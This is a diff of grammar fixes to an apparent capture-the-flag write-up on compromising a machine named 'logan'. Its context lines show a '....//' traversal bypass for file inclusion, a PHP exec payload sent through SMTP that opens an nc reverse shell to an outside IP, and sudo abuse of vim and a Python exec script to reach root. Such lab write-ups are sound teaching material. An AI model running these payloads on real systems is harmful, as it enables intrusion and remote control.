@@ -102,13 +102,13 @@ So, I checked out the website.
 ![](./img/web_04.png)
 - Upload files
 ![](./img/web_05.png)
-I have uploaded some files. But, I could not find the files from the website.
+I uploaded some files. But, I could not find the files on the website.
 - Logs
 ![](./img/web_06.png)
 There was neither clearlogs.php file nor backup files (clearlogs.php.bak, and so on) on the website.
 - Payments
 ![](./img/web_07.png)
-I found that there was some files (01, 02, 03) on the website.
+I found there are three files (01, 02, 03) on the website.
 I realized the website removed "../" strings from input strings after trying many things.
 ![](./img/web_08.png)
 So, I tried "....//....//....//....//etc/passwd" strings, I could get LFI (Local File Inclusion) from the website.
@@ -128,7 +128,7 @@ rcpt to:<?php exec("rm /tmp/p;mkfifo /tmp/p;cat /tmp/p|/bin/sh -i 2>&1|nc 192.16
 ![](./img/shell_01.png)
 I could get a user shell (www-data).
 
-When I executed sudo command, I found that I could execute vim command with logan's privileges.
+When I executed sudo command, I found I can execute vim command with logan's privileges.
 ```
 www-data@logan:/var/www/admin$ sudo -l
 Matching Defaults entries for www-data on logan:
@@ -174,7 +174,7 @@ logan@logan:~$ cat to-do
 - Try the new script that gave me root to learn python
 ```
 
-When I executed sudo command, I found that I could execute a python script with root's privileges.
+When I executed sudo command, I found I can execute a python script with root's privileges.
 ```
 logan@logan:~$ sudo -l
 Matching Defaults entries for logan on logan:
@@ -202,7 +202,7 @@ NameError: name 'aaaaa' is not defined
 ```
 
 It looks like I can enter python scripts into the exec function.
-So, I entered the following.
+So, I entered the following into it.
 ```
 import os;os.system("/bin/bash");
 ```
